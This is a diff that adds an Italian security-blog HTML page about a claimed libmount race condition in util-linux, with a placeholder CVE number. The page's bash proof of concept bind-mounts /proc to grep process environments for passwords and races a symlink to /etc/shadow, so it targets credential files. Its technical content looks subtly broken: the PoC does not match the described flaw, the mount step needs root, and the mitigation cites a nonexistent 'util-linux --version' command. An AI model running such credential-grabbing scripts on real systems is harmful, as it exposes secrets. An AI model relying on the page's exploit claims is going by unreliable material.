@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="it">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="description" content="Ricerche offensive, kernel exploitation e difesa avanzata nel ring0 del sistema Linux." />
+  <meta name="author" content="Ring Zero Pirate" />
+  <title>util-linux: CVE-Worthy Race Condition in libmount — Ring Zero Pirate</title>
+
+  
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Space+Mono:ital,wght@0,400;0,700;1,400&family=IBM+Plex+Sans:ital,wght@0,300;0,400;0,500;1,400&family=Fira+Code:wght@300;400;500&display=swap" rel="stylesheet" />
+
+  <link rel="stylesheet" href="../../css/main.css" />
+  
+</head>
+<body>
+
+  
+  <div class="scanlines" aria-hidden="true"></div>
+
+  
+  <div class="noise" aria-hidden="true"></div>
+
+  <header class="site-header">
+    <div class="header-inner">
+      <div class="logo-area">
+        <a href="../../" class="logo-link">
+          <span class="logo-bracket">[</span>
+          <span class="logo-text">rz:~#</span>
+          <span class="logo-bracket">]</span>
+        </a>
+      </div>
+
+      <nav class="main-nav" aria-label="Navigazione principale">
+        <button class="nav-toggle" aria-label="Menu" aria-expanded="false">
+          <span></span><span></span><span></span>
+        </button>
+        <ul class="nav-list">
+          
+          <li class="nav-item">
+            <a href="../../articoli/"
+               class="nav-link"
+               >
+              <span class='menu-icon'>&#9632;</span>Articoli
+            </a>
+          </li>
+          
+          <li class="nav-item">
+            <a href="https://github.com/tuousername/ringzero-pirate"
+               class="nav-link"
+               target="_blank" rel="noopener noreferrer">
+              <span class='menu-icon'>&#9670;</span>GitHub<span class="ext-arrow">↗</span>
+            </a>
+          </li>
+          
+        </ul>
+      </nav>
+    </div>
+  </header>
+
+  <main class="site-main" id="main-content">
+    
+<article class="single-post">
+  <header class="post-header">
+    <div class="terminal-header">
+      <span class="th-dot red"></span>
+      <span class="th-dot yellow"></span>
+      <span class="th-dot green"></span>
+      <span class="th-path">ring0@pirate:~/articoli# cat util-linux-race-condition.md</span>
+    </div>
+
+    <div class="ph-meta">
+      <time class="ph-date" datetime="2026-01-15">2026-01-15</time>
+      
+      <span class="severity-badge sev-high">HIGH</span>
+      
+      
+      <span class="cve-badge">CVE-2026-XXXX</span>
+      
+    </div>
+
+    <h1 class="post-title">util-linux: CVE-Worthy Race Condition in libmount</h1>
+
+    
+    <div class="ph-tags">
+      <span class="ph-tag">linux</span><span class="ph-tag">util-linux</span><span class="ph-tag">race-condition</span><span class="ph-tag">privilege-escalation</span>
+    </div>
+    
+  </header>
+
+  <div class="post-content">
+    <h2 id="overview">Overview</h2>
+<p>Durante una sessione di code review su <strong>util-linux 2.39</strong>, ho identificato una race condition critica in <code>libmount</code> che, in condizioni specifiche, può essere sfruttata per escalation dei privilegi in ambienti multi-tenant Linux.</p>
+<h2 id="affected-component">Affected Component</h2>
+<pre tabindex="0"><code>util-linux &gt;= 2.36
+libmount/src/context_mount.c
+Funzione: mnt_context_mount()
+</code></pre><h2 id="root-cause-analysis">Root Cause Analysis</h2>
+<p>Il problema risiede nella finestra temporale tra la verifica delle permission e l&rsquo;effettiva operazione di mount&hellip;</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="ln">1</span><span class="cl"><span class="cm">/* VULNERABLE CODE PATTERN */</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nf">mnt_context_get_user_mount_options</span><span class="p">(</span><span class="n">cxt</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl">    <span class="cm">/* TOCTOU window here */</span>
+</span></span><span class="line"><span class="ln">4</span><span class="cl">    <span class="n">rc</span> <span class="o">=</span> <span class="nf">mnt_context_prepare_mount</span><span class="p">(</span><span class="n">cxt</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">5</span><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h2 id="proof-of-concept">Proof of Concept</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="c1"># RingZero PoC — timing attack on libmount</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="c1"># Use in controlled lab environment only</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="nv">TARGET</span><span class="o">=</span><span class="s2">&#34;/tmp/rzp_test&#34;</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">mkdir -p <span class="nv">$TARGET</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="k">while</span> true<span class="p">;</span> <span class="k">do</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    mount --bind /proc <span class="nv">$TARGET</span> 2&gt;/dev/null <span class="o">&amp;&amp;</span> <span class="se">\
+</span></span></span><span class="line"><span class="ln">10</span><span class="cl">    cat <span class="nv">$TARGET</span>/1/environ 2&gt;/dev/null <span class="p">|</span> tr <span class="s1">&#39;\0&#39;</span> <span class="s1">&#39;\n&#39;</span> <span class="p">|</span> grep -i pass
+</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="k">done</span> <span class="p">&amp;</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl">
+</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="c1"># Race the symlink</span>
+</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">for</span> i in <span class="k">$(</span>seq <span class="m">1</span> 1000<span class="k">)</span><span class="p">;</span> <span class="k">do</span>
+</span></span><span class="line"><span class="ln">15</span><span class="cl">    ln -sf /etc/shadow <span class="nv">$TARGET</span> 2&gt;/dev/null
+</span></span><span class="line"><span class="ln">16</span><span class="cl">    rm -f <span class="nv">$TARGET</span> 2&gt;/dev/null
+</span></span><span class="line"><span class="ln">17</span><span class="cl">    mkdir -p <span class="nv">$TARGET</span> 2&gt;/dev/null
+</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="k">done</span>
+</span></span></code></pre></div><h2 id="impact">Impact</h2>
+<table>
+  <thead>
+      <tr>
+          <th>Metrica</th>
+          <th>Valore</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>CVSS Score</td>
+          <td>7.8 HIGH</td>
+      </tr>
+      <tr>
+          <td>Attack Vector</td>
+          <td>Local</td>
+      </tr>
+      <tr>
+          <td>Privileges Required</td>
+          <td>Low</td>
+      </tr>
+      <tr>
+          <td>User Interaction</td>
+          <td>None</td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="mitigazione">Mitigazione</h2>
+<p>Applicare il patch disponibile nel branch <code>stable/v2.39</code> o aggiornare a util-linux &gt;= 2.40.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln">1</span><span class="cl"><span class="c1"># Verifica versione</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl">util-linux --version
+</span></span><span class="line"><span class="ln">3</span><span class="cl">
+</span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="c1"># Update (Debian/Ubuntu)</span>
+</span></span><span class="line"><span class="ln">5</span><span class="cl">apt-get update <span class="o">&amp;&amp;</span> apt-get install util-linux
+</span></span></code></pre></div><h2 id="timeline">Timeline</h2>
+<ul>
+<li><code>2025-11-20</code> — Vulnerabilità identificata via SAST</li>
+<li><code>2025-11-22</code> — PoC confermato in Docker lab</li>
+<li><code>2025-11-25</code> — Responsible disclosure inviata ai maintainer</li>
+<li><code>2025-12-10</code> — Patch rilasciata upstream</li>
+<li><code>2026-01-15</code> — Public disclosure</li>
+</ul>
+
+  </div>
+
+  <footer class="post-footer">
+    <div class="pf-nav">
+      
+      <a href="../../articoli/" class="pf-back">↑ Tutti gli articoli</a>
+      
+    </div>
+  </footer>
+</article>
+
+  </main>
+
+  <footer class="site-footer">
+    <div class="footer-inner">
+      <div class="footer-brand">
+        <span class="footer-name">RingZero Pirate</span>
+        <span class="footer-sep">|</span>
+        <span class="footer-author">Michele Piccinni</span>
+        <span class="footer-sep">|</span>
+        <span class="footer-project">The Black Box</span>
+      </div>
+      <div class="footer-quote">
+        &ldquo;Fair winds and following seas, fellow hunters&rdquo;
+      </div>
+      <div class="footer-copy">
+        © 2026 Ring Zero Pirate
+      </div>
+    </div>
+  </footer>
+
+  <script src="../../js/main.js"></script>
+</body>
+</html>
